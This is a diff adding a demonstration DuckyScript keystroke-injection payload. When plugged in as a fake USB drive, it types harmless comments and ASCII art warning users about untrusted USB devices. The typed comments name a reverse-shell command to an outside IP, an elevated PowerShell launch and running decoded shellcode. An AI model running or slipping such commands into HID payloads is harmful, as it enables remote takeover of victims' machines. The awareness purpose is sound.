@@ -1,0 +1,129 @@
+DELAY 5000
+GUI r
+DELAY 500
+STRING kali
+DELAY 500
+ENTER
+DELAY 5000
+STRING clear
+DELAY 500
+ENTER
+DELAY 500
+STRING #O HAI!
+ENTER
+STRING #This is a demo payload, which will write out as you see here,
+ENTER
+STRING #Whilst this is an innocent example, it could instead be made malicious, easily ...
+ENTER
+STRING #For example I _could_ execute /bin/bash -i /dev/tcp/123.123.123.123/6667 2>&1 &
+ENTER
+STRING #OR, GUI + R, powershell Start-Process cmd -Verb runAs
+ENTER
+STRING #OR write out a base64 / other encoded string into a pipe to decode shellcode or other into a binary file and then execute that file.
+ENTER
+STRING #A bash script, a python script, a go program, tclExpect, Powershell ... the list does go on and on and on.
+ENTER
+STRING #Hopefully now you see that just because I look like a USB drive ... that does not mean I am storage, by any means.
+ENTER
+STRING #The same is true of USB cables, there are MANY proof of concetps out there that embed HID atatcks in USB cables.
+ENTER
+STRING #Now maybe you'll think twice before plugging that *unknown* USB device into your system?
+ENTER
+STRING #As who knows what I may do ...
+ENTER
+STRING #Or whom will be watching ...
+ENTER
+DELAY 1000
+STRING #;,;;,,;;;;;;;;;;;;;;;;;;::;:::;;;::colc::::ccc:cc:c:cc:cccc::c::cc:::::::::::::;::::
+ENTER
+STRING #;;,,,;;;,;;;;;;;;;;;;;;;;;;;:cdkO0KXXNNKKkl::::::::::::c:::::::::::::::::::::;;;;::;
+ENTER
+STRING #,,,,,,,,,,,;;;;;;;;;;;;;;;cdOKK0KKXNNNNXNNNKd:::::::::::::::::::;:::::;;:;;;;;;;;,;;
+ENTER
+STRING #,',,,,,,,,,;,;;;;;;;;;;,;ckK0OOKKXNNXNWXKXKXKOl:;:::::::::::;:::;;;;:;;;;;;;;;;,,,,;
+ENTER
+STRING #,,',,,,,,,,,;;,;,;;;;;;;cxkxoxdK0XXXXKX0ddOK00O:;;;;:;:::;;;;::;;;;;;;;;;;;;,;,,,,,,
+ENTER
+STRING #','',,,,,,,,,,,,,;;;;;;;;cl:;:cxldoolcc;,,;okxkl;;;;::::::;;;;;;;;;;;;;;;;;;,,,,,,,,
+ENTER
+STRING #',,'',,,,,,,,,,,,,,;;;;,,c;.  .;',,,,,,,''',ldkk;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,,,,,,,
+ENTER
+STRING #''''',,,,,,,,,,,,,,;;;;,,;,   ..'.',,,,''''''cxk;;;;;;;;;;;;;;;;;;;;;;;;;;;;,,,,,,,,
+ENTER
+STRING #'''''',,,,,,,,,,,,,,,,;;,,,   ..'',,,,,,,'.'.;xo;;;;;;;;;;;;;;;;;;;;;;;;,,,,,,,,,,,,
+ENTER
+STRING #''''''''',,,,,,,,,,,,,,,,,;.  .,;,.',:looc;,'cxc;;;;;;;;;;;;;;;;;;;;;;;;;;;,,,,,,,''
+ENTER
+STRING #'''''''',,,,,,,,,,,,;,,,,,:; ..coo..,:cc:;,'.,Ox;;;;;;;;;;;;;;;;;;;;;;;,,,,,,,,,''''
+ENTER
+STRING #''''''''',,,,,,,;;'.....'ccl' .';;..;;ccc,''.'d0c;;;;;;;;;;;;;;;;;;;;;;;;,,,,,''''''
+ENTER
+STRING #''''''',ldc,;:ccc..,:.  .looc  ':l'.;lddodl,';xK0kxxdo:;;;;;;;;;;;;;;;;,;,,,,,,,''''
+ENTER
+STRING #,,;;;;;;x0k:ccll;lOdddxKNXNXx..:occldddoOd::;lk0KMMMMMXxl;:c::;;:;;;;;;;,,,,,,,''''.
+ENTER
+STRING #lc......cKXkOdl.,KWWMMMMMMMMNo.':;c,',;oc,,lxOXKokWMMMMMWKKNNXO0dc;;;;;;,,,,,'''....
+ENTER
+STRING #cllc,    ll:::kXWMMMMMMMMMMMMNklc;..,:cc:,l0XNN0lKMMMMMMMMMMMMMMWNKkxlcc:;,,'''.....
+ENTER
+STRING #.,xXx......';cKMMMWWWMMMMMMMMMWNKk:.';ccco0NNWXOXMMMMMMMMMMMMMMMMMMMMNNX0l;,'''.....
+ENTER
+STRING #:dNW0::::codXWMMMMWWMMMMMMMMMMMMWNX0xdkkKNNNWNNMMMMMMMMMMMMMMMMMMMMMMMMMWXx,'''.....
+ENTER
+STRING #;oWWK;;;,;oNMMMMWWMMMMMMMMMMMMMMMMWWWWWWWWWWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMWx,,''.....
+ENTER
+STRING #'cWNW:,,,,l0WWWMMMMMMMMMMMMMMMMMMMMWMMWXK00kxk0KKKKKXNWWMMMMMMMMMMMMMMMMMMWkd;,'....
+ENTER
+STRING #';XKN,''':KWMMMMMMMMMMMMMMMMMMMMWKOdc;',,:lxolccooxdxkOOklO000XWMMMMMMMMMMMMWk:,'''.
+ENTER
+STRING #.,00k:cONWWMMMMMMMMMMMMMMMMMMKx:,:lloxk0KXNNNNNMMMMWMMMMMMMWXdolx0XMMMMMMMMMWXc,''''
+ENTER
+STRING #..OKXWWWMMMMMMMMMMMMMMMMMMNdc;dkKKKKKKXXXXNXNNNMMMMMMMMMMMMMMWWW0c'kKNMMMMMMMM0o,'''
+ENTER
+STRING #..oXXWMMMMMMMMMMMMMMMMMMKl;ckKK00000KKKKXXXNNNNMMMMMMMMMMMMMMMMWWWNOo::KNMMMMMWk:,,,
+ENTER
+STRING #...oxdkNMMMMMMMMMMMMMMNl,;xK000O0000KKKKKKXXXNWMMMMMMMMMMMMMMMMMWWMWWXOxxxKMMMWNd;;,
+ENTER
+STRING #..clxNMMMMMMMMMMMMMMMk.'oK0O0OOO0000K0K0KKXXXNWMMMMMMMMMMMMMMMMMWMMMWWWWk,:xNMMNk;;;
+ENTER
+STRING #dKW0x0kONMMMMMMMMMMMo..cKK0O0O00OO0O0000KKKXXXNMMMMMMMMMMMMMMMMMMMMWMWWWWWKo:oXNx:::
+ENTER
+STRING #XXMWOl:lkNWWWWMMMMMk..:K00O0OkOOO00OOO00KKKXXXNMMMMMMMMMMMMMMMMMMMMMMWWWWWWWX:c0NkoO
+ENTER
+STRING #NNMMo:oOKWWMMMMMMMX' ,0OOOOOOkOOOOOOO000KKKKXXWMMMMMMMMMMMMMMMMMMMMMMMMWWWWWWNd,kX0N
+ENTER
+STRING #KNMMK:cKWMMMMMMMMM;..0kxkOOOkkkkkOOOO000KKKKXXWMMMMMMMMMMMMMMMMMMMWMMMMMWWWWWWNx'lKN
+ENTER
+STRING #'XMMWdOMMMMMMMMMMO. OkxxkxkkkxkOkkOO00000KKKKXWMMMMMMMMMMMMMMMMMWMMMMMMWWWWWWWWNo,OW
+ENTER
+STRING #;MMMXWMMMMMMMMMN. d0kxxxdxxkxkkkOOOO000000KKXXMMMMMMMMMMMWMMMMMMMMMMMMMWWWWWWWWN;'0
+ENTER
+STRING #.WMMWWMMMMMMMMMk.,XkkkkxxddxxxkkOOOO00000kxxkoxxxONWMMMMMMMWWMWWMMMMMWWMWWWWWWWW0'o
+ENTER
+STRING #.WMMMMMMMMMMMMMo.00kkkkkxxddxxkkkOOOOOOo;,,:oxkl,'';kWMMMMMMWWWWMMMMMMMMWMWWWWWWN'.
+ENTER
+STRING #.WMMMMMMMMMMMMMx'NKOkkkkkxxxxxxxkOOOOOc.  ':do';oddc,,XMMMMMMWWWWWMMMMMMWWWWWWWWNl.
+ENTER
+STRING #.WMWMMMMMMMMMMMkcNXK00OOkxxxxxxkkkOkOd:   'lOl,cdl:l:'.NMMMMMMWMMWMMMWMMMWWWWWWWWx.
+ENTER
+STRING #.WMWMMMMMMMMMMMKlNNXKK0OkxxxxxxkkOOkOxc,.  lKx00xl;,c:,xMMMMMMMMMWMMMMMMWWWWWWWWWO'
+ENTER
+STRING #.'WMMMMMMMMMMMMMNkNNNXK00OxxxddxxkkOOO0xkO0dOKOWNXo,''..OMMMMMMMMMWMMMMMWWWWWWWWWWk;
+ENTER
+STRING #.WMMMMMMMMMMMMMMKXNNNXX000OkkxxkkOOOO0KOXWWWNWWNKc..''oMMMMMMMMMMMMMMMMMMWWWWWWWWc:
+ENTER
+STRING #.,MMMMMMMMMMMMMMMMXKNNNNXK0O0OkxkkkOkOOO000KkXNXXKdc:oKMMMMMMMMMMMMMMMWMWMWWWWWWWK;'
+ENTER
+STRING #',WMMMMMMMMMMMMMMMM0XNNNNXX0O0OkkOOkxkOOO0Okkkk00OOKWMMMMMMMMMMMMMMMMMWWWWWWWWWWN;',
+ENTER
+STRING #.,WWMMMMMMMMMMMMMMMMXNNNNNNX000O0OOkkkkOO00O00KMWWWWWWWWWMMMMMMWMMWMMMMWWWWWWWWWO';c
+ENTER
+ENTER
+STRING # Now you see it.
+ENTER
+DELAY 5000
+STRING clear
+ENTER
+STRING # Now you don't ...
+ENTER
+STRING #... The End ... ?
